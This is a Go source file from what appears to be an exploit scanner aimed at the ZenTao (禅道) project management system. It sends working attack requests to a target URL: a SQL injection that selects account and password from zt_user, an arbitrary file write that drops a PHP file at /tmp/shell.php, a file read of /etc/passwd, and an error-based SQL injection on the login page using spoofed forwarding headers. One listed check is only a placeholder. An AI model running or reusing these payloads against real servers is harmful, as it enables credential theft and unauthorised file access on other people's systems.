package Cms

import (
	"context"
	"fmt"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

type ChanDao struct {
	Url     string
	Choose  string
	Thread  int
	Timeout int
	Payload string
	Result  chan string
}

func (chandao *ChanDao) ExpListInfoExploit() []string {
	return []string{
		"All",
		"禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞",
		"禅道 11.6 api-getModel-editor-save-filePath 任意文件写入漏洞",
		"禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
		"禅道 12.4.2 后台任意文件上传漏洞 CNVD-C-2020-121325",
		"禅道 16.5 router.class.php SQL注入漏洞",
	}
}

func (chandao *ChanDao) RunExploit() {
	switch chandao.Choose {
	case "All":
		chandao.api_getModel_api_sql_sql()
		chandao.api_getModel_editor_save_filePath()
		chandao.api_getModel_api_getMethod_filePath()
		chandao.CNVD_C_2020_121325()
		chandao.router_class_php_sql()
		break
	case "禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞":
		chandao.api_getModel_api_sql_sql()
		break
	case "禅道 11.6 api-getModel-editor-save-filePath 任意文件写入漏洞":
		chandao.api_getModel_editor_save_filePath()
		break
	case "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞":
		chandao.api_getModel_api_getMethod_filePath()
		break
	case "禅道 12.4.2 后台任意文件上传漏洞 CNVD-C-2020-121325":
		chandao.CNVD_C_2020_121325()
		break
	case "禅道 16.5 router.class.php SQL注入漏洞":
		chandao.router_class_php_sql()
		break
	default:
		break
	}
}

func (chandao *ChanDao) api_getModel_api_sql_sql() {
	path := "/api-getModel-api-sql-sql=select+account,password+from+zt_user"

	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(chandao.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"Cookie":     "zentaosid=gkdemsl670ebl7shke9s83csg7; lang=zh-cn; device=desktop; theme=default; windowWidth=1310; windowHeight=709",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", chandao.Url, path))
	if err != nil {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "api_getModel_api_sql_sql检测失败", chandao.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "success") == true || strings.Contains(resp.String(), "select") == true {
		chandao.Result <- fmt.Sprintf("[+]%s -> %s\n", "api_getModel_api_sql_sql存在漏洞", chandao.Url+path)

		return
	} else {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s\n", "api_getModel_api_sql_sql不存在漏洞", chandao.Url)
		return
	}
}

func (chandao *ChanDao) api_getModel_editor_save_filePath() {
	path := "/api-getModel-editor-save-filePath=/tmp/shell.php"
	chandao.Payload = "fileContent=<?php phpinfo();?>"
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(chandao.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"Cookie":       "zentaosid=gkdemsl670ebl7shke9s83csg7; lang=zh-cn; device=desktop; theme=default; windowWidth=1310; windowHeight=709",
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetBodyString(chandao.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", chandao.Url, path))
	if err != nil {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "api_getModel_editor_save_filePath检测失败", chandao.Url, err.Error())
		return
	}

	path = "/api-getModel-api-getMethod-filePath=/tmp/shell/1"
	resp, err = req.SetHeaders(map[string]string{
		"Cookie":     "zentaosid=gkdemsl670ebl7shke9s83csg7; lang=zh-cn; device=desktop; theme=default; windowWidth=1310; windowHeight=709",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", chandao.Url, path))
	if err != nil {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "api_getModel_editor_save_filePath检测失败", chandao.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "PHP Version") == true || strings.Contains(resp.String(), "HTTP Headers Information") == true {
		chandao.Result <- fmt.Sprintf("[+]%s -> %s\n", "api_getModel_editor_save_filePath存在漏洞", chandao.Url+path)
		return
	} else {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s\n", "api_getModel_editor_save_filePath不存在漏洞", chandao.Url)
		return
	}
}

func (chandao *ChanDao) api_getModel_api_getMethod_filePath() {
	path := "/api-getModel-api-getMethod-filePath=/etc/passwd/1"
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(chandao.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"Cookie":     "zentaosid=gkdemsl670ebl7shke9s83csg7; lang=zh-cn; device=desktop; theme=default; windowWidth=1310; windowHeight=709",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", chandao.Url, path))
	if err != nil {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "api_getModel_api_getMethod_filePath检测失败", chandao.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "root") == true || strings.Contains(resp.String(), "/usr/sbin") == true {
		chandao.Result <- fmt.Sprintf("[+]%s -> %s\n", "api_getModel_api_getMethod_filePath存在漏洞", chandao.Url+path)
		return
	} else {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s\n", "api_getModel_api_getMethod_filePath不存在漏洞", chandao.Url)
		return
	}
}

func (chandao *ChanDao) CNVD_C_2020_121325() {
	chandao.Result <- fmt.Sprintf("[!]%s -> %s\n", "CNVD_C_2020_121325不存在漏洞 作者没写", chandao.Url)
}

func (chandao *ChanDao) router_class_php_sql() {
	path := "/user-login.html"
	chandao.Payload = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"

	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(chandao.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"Cookie":           "zentaosid=gkdemsl670ebl7shke9s83csg7; lang=zh-cn; device=desktop; theme=default; windowWidth=1310; windowHeight=709",
		"User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type":     "application/x-www-form-urlencoded",
		"X-Forwarded-For":  "127.0.0.1",
		"x-originating-ip": "127.0.0.1",
		"x-remote-addr":    "127.0.0.1",
		"x-remote-ip":      "127.0.0.1",
	}).SetBodyString(chandao.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", chandao.Url, path))
	if err != nil {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "router_class_php_sql检测失败", chandao.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "@localhost") == true || strings.Contains(resp.String(), "/www/wwwroot") == true {
		chandao.Result <- fmt.Sprintf("[+]%s -> %s\n", "router_class_php_sql存在漏洞", chandao.Url+path)
		return
	} else {
		chandao.Result <- fmt.Sprintf("[-]%s -> %s\n", "router_class_php_sql不存在漏洞", chandao.Url)
		chandao.Result <- fmt.Sprintf("\x1b[0;%dm%s\x1b[0m", 90, "666")
		fmt.Println(fmt.Sprintf("\x1b[0;%dm%s\x1b[0m", 120, "666"))
		return
	}
}
